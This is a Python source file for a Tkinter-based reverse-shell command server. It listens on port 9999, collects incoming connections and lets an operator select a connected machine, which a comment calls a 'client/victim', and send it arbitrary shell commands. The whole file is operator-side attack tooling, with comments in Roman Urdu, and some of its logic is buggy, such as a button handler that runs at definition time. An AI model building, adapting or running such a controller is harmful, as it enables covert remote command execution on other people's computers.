import socket

import threading
from threading import *
import time
from queue import Queue
from tkinter import *
import tkinter as tk
from collections import OrderedDict

NUMBER_OF_THREADS = 2
JOB_NUMBER = [1, 2, ]
queue = Queue()
all_connections = []
all_address = []

root = Tk()
root.geometry("400x400")
l1 = tk.Listbox(root)


# Create a Socket ( connect two computers)
def create_socket():
    try:
        global host
        global port
        global s
        host = ""
        port = 9999
        s = socket.socket()

    except socket.error as msg:
        print("Socket creation error: " + str(msg))


# Binding the socket and listening for connections
def bind_socket():
    try:
        global host
        global port
        global s
        print("Binding the Port: " + str(port))

        s.bind((host, port))
        s.listen(5)

    except socket.error as msg:
        print("Socket Binding error" + str(msg) + "\n" + "Retrying...")
        bind_socket()


# Handling connection from multiple clients and saving to a list
# Closing previous connections when server.py file is restarted
for c in all_connections:
    # c.close()

    del all_connections[:]
    del all_address[:]


def accepting_connections():
    # sab connections ko refresh kar dy ga mtlb jab b server file dubara run ho gi connections delete kar dy ga
    conn, address = s.accept()
    # connections accpt ho gy mtlb clients accpt ho gy

    s.setblocking(1)  # prevents timeout

    all_connections.append(conn)
    # jo naya client ya connection aye ga all_connection wali list may add hota rhy ga
    all_address.append(address)
    # is may naya ip add hota rahy ga
    print("Connection has been established :" + address[0])
    list_connections()


# 2nd thread functions - 1) See all the clients 2) Select a client 3) Send commands to the connected client
# Interactive prompt for sending commands
# turtle> list
# 0 Friend-A Port
# 1 Friend-B Port
# 2 Friend-C Port
# turtle> select 1
# 192.168.0.112> dir
# iss may turtle sirf aik name jo shell pr show ho ga kuch b rkh skty hy

def start_turtle():
    while True:
        cmd = input('turtle> ')
        if cmd == 'list':
            list_connections()
        elif 'select' in cmd:
            conn = get_target(cmd)
            # if conn is not None:
            #    send_target_commands(conn)

        else:
            print("Command not recognized")


# Display all current active connections with client

def list_connections():
    results = ''
    l1.delete(0, END)
    print("----Clients----")
    for i, conn in enumerate(all_connections):
        # enumerate means iterate
        try:
            conn.send(str.encode('ipconfig'))
            # dummy connection request for checking client is active or not
            conn.recv(2048)

        except:
            del all_connections[i]
            del all_address[i]
            continue

        results = str(i) + "   " + str(all_address[i][0]) + "   " + str(all_address[i][1])
        print("\n", results, "\n")
        l1.insert(END, results)


# Selecting the target
def get_target(cmd):
    try:
        target = cmd.replace('select ', '')  # target = id
        target = int(target)
        conn = all_connections[target]
        print("You are now connected to :" + str(all_address[target][0]))
        print(str(all_address[target][0]) + ">", end="")
        return conn
        # 192.168.0.4> dir

    except:
        print("Selection not valid")
        return None


# Send commands to client/victim or a friend
def send_target_commands(conn, entry1, w):
    try:
        cmd = entry1.get()
        if len(str.encode(cmd)) > 0:
            conn.send(str.encode(cmd))
            client_response = str(conn.recv(2048), "utf-8")
            print(client_response, end="")
            w.configure(state="normal")
            w.delete("1.0", "end")
            w.insert(1.0, client_response)
            w.configure(state="disabled")
    except:
        print("Error sending commands")


# Create Worker Threads
# 1 thread handle connection
# 2 thread sending commands
# use for loop
# create thread
# assign t = threading.Thread()
# t.demon = true (free memory in a thread after programs end)
# if t.demon = false (it will not free memory after programs end run in background consume memory )
# if t.start start thread


# store jobs in queue bcz thread look for jobs in a queue and not in a list

# create work function
# if job is 1 then handle connections
# if job is 2 then send commands


def create_workers():
    for _ in range(NUMBER_OF_THREADS):
        t = threading.Thread(target=work)  # making thread what kind of work is to do
        t.daemon = True
        #   iss may yeh hota hy k yeh make sure karry ga k jab b program end hota hy toh thread b end hota hy
        t.start()


# create work function
# if job is 1 then handle connections
# if job is 2 then send commands

def work():
    accepting_connections()


def access():
    value = l1.get(l1.curselection())
    v1 = value[0]
    conn = get_target(v1)
    # root.withdraw()
    newgui = Tk()
    newgui.geometry("600x600")
    entry1 = Entry(newgui)
    entry1.pack()
    Button(newgui, text="SEND", command=lambda: send_target_commands(conn, entry1, w)).pack()
    w = Text(newgui, height=100, borderwidth=0)
    w.pack()
    newgui.mainloop()


def sendcmd(conn, entry1):
    send_target_commands(conn, entry1)


Button(root, text="Create Workers", command=create_workers).pack()
Button(root, text="Update List", command=threading.Thread(target=list_connections).start()).pack()
Button(root, text="ACCESS", command=access).pack()
l1.pack(expand=True, fill=BOTH, side=LEFT)
create_socket()
bind_socket()
# Execute Tkinter
root.mainloop()



